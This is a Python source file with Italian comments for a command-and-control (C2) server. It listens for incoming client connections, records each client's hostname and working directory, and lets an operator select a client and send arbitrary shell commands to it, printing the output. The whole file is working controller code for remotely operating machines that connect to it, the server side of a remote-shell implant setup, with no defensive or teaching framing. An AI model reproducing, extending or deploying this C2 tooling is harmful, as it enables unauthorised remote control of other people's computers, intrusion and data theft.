import os
import socket
import threading
import yaml
from datetime import datetime
from pathlib import Path

class ClientHandler:
    """Gestisce la singola connessione con un client."""
    def __init__(self, connection, address):
        self.conn = connection
        self.addr = address
        self.hostname = ""
        self.current_path = ""

    def send(self, data):
        self.conn.send(data.encode('utf-8'))

    def receive(self, buffer_size=4096):
        try:
            return self.conn.recv(buffer_size).decode('utf-8', errors="replace")
        except:
            return ""

    def close(self):
        self.conn.close()


class C2Server:
    """Il nucleo del Server Command & Control con supporto YAML."""
    def __init__(self, config_path="../conf/configuration.yaml"):
        self.config_path = Path(config_path)
        self.setup_directories()
        
        # Caricamento configurazione
        config = self.load_config()
        print(config)
        self.host = config['host']
        self.port = config['port']
        self.max_connections = config['max_connections']
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}  
        self.client_id_counter = 0
        self.selected_id = None
        self.lock = threading.Lock()

    def setup_directories(self):
        """Crea le cartelle necessarie usando pathlib."""
        Path("../log").mkdir(exist_ok=True)
        Path("../conf").mkdir(exist_ok=True)

    def load_config(self):
        """Carica configurazione da YAML o imposta i default richiesti."""
        default_config = {
            'host': '0.0.0.0',
            'port': 7771,
            'max_connections': 5
        }

        if self.config_path.exists():
            try:
                with open(self.config_path, 'r') as f:
                    data = yaml.safe_load(f)
                    server_data = data.get('server', {})
                    print("[*] Configurazione YAML caricata.")
                    return {
                        'host': server_data.get('host', default_config['host']),
                        'port': server_data.get('port', default_config['port']),
                        'max_connections': server_data.get('maxc', default_config['max_connections'])
                    }
            except Exception as e:
                print(f"[!] Errore YAML: {e}. Uso default.")
        else:
            print("[!] File configurazione mancante. Creazione in corso...")
            self.save_config(default_config)
        
        return default_config

    def save_config(self, config):
        """Salva la configurazione corrente in formato YAML."""
        try:
            with open(self.config_path, 'w') as f:
                # Struttura richiesta: host, port, maxc
                yaml_data = {
                    'server': {
                        'host': config['host'],
                        'port': config['port'],
                        'maxc': config['max_connections']
                    }
                }
                yaml.dump(yaml_data, f, default_flow_style=False)
        except Exception as e:
            print(f"[!] Errore salvataggio config: {e}")

    def log(self, message):
        log_path = Path(f"../log/server.log")
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_path, "a") as f:
            f.write(f"[{timestamp}] {message}\n")

    def display_help(self):
        help_text = """
============================================================
               GUIDA COMANDI C2 SERVER
============================================================
Comandi Generali:
  list             - Mostra tutti i client connessi
  select <ID>      - Prende il controllo del client specificato
  exit / quit      - Chiude il server
  help             - Mostra questa guida

Comandi Sessione (dopo 'select'):
  back             - Torna al menu principale (mantiene connessione)
  cclose           - Chiude la sessione e disconnette il client
  <qualsiasi altro>- Inviato come comando shell al client
============================================================
"""
        print(help_text)

    def start(self):
        try:
            # Permette il riutilizzo dell'indirizzo se il server viene riavviato subito
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_connections)
            
            threading.Thread(target=self.accept_loop, daemon=True).start()
            
            print(f"[*] Server ascolta su {self.host}:{self.port} (Max Client: {self.max_connections})")
            self.log("Server Started")
            self.display_help()
            self.terminal()
        except Exception as e:
            print(f"[!] Errore avvio server: {e}")

    def accept_loop(self):
        while True:
            try:
                conn, addr = self.server_socket.accept()
                with self.lock:
                    if len(self.clients) < self.max_connections:
                        self.client_id_counter += 1
                        new_client = ClientHandler(conn, addr)
                        
                        data = new_client.receive().strip()
                        if "#" in data:
                            new_client.current_path, new_client.hostname = data.split("#")
                        
                        self.clients[self.client_id_counter] = new_client
                        print(f"\n[+] Nuovo client: {addr} (ID: {self.client_id_counter})")
                    else:
                        conn.close()
            except:
                break

    def list_clients(self):
        print("\nID\tIndirizzo\t\tHostname")
        print("-" * 45)
        with self.lock:
            for cid, c in self.clients.items():
                print(f"{cid}\t{c.addr[0]}:{c.addr[1]}\t{c.hostname}")
        print("-" * 45)

    def terminal(self):
        while True:
            if not self.selected_id:
                cmd = input("C2-Server > ").strip().lower()
            else:
                with self.lock:
                    if self.selected_id not in self.clients:
                        print("[!] Client disconnesso.")
                        self.selected_id = None
                        continue
                    target = self.clients[self.selected_id]
                cmd = input(f"[{self.selected_id}] {target.hostname}@{target.current_path} > ").strip()

            if not cmd: continue

            if cmd in ['exit', 'quit']:
                print("[*] Spegnimento server...")
                break
            elif cmd == 'help':
                self.display_help()
            elif cmd == 'list':
                self.list_clients()
            elif cmd.startswith('select '):
                try:
                    parts = cmd.split(' ')
                    if len(parts) > 1:
                        cid = int(parts[1])
                        if cid in self.clients:
                            self.selected_id = cid
                            print(f"[*] Sessione avviata con ID {cid}")
                        else:
                            print("[!] ID non trovato.")
                except: print("[!] Uso: select <id>")
            elif cmd == 'back':
                self.selected_id = None
            elif self.selected_id:
                self.send_command(cmd)

    def send_command(self, cmd):
        with self.lock:
            target = self.clients.get(self.selected_id)
        
        if not target: return

        try:
            target.send(cmd)
            if cmd == 'cclose':
                with self.lock:
                    del self.clients[self.selected_id]
                print(f"[*] Sessione ID {self.selected_id} chiusa.")
                self.selected_id = None
                return

            response = target.receive()
            if "#path#" in response:
                output, path = response.split("#path#")
                target.current_path = path.strip()
                if output.strip() and output.strip() != ".":
                    print(output)
            else:
                print(response)
        except:
            print(f"[!] Connessione persa con ID {self.selected_id}")
            with self.lock:
                if self.selected_id in self.clients:
                    del self.clients[self.selected_id]
            self.selected_id = None

if __name__ == "__main__":
    server = C2Server()
    server.start()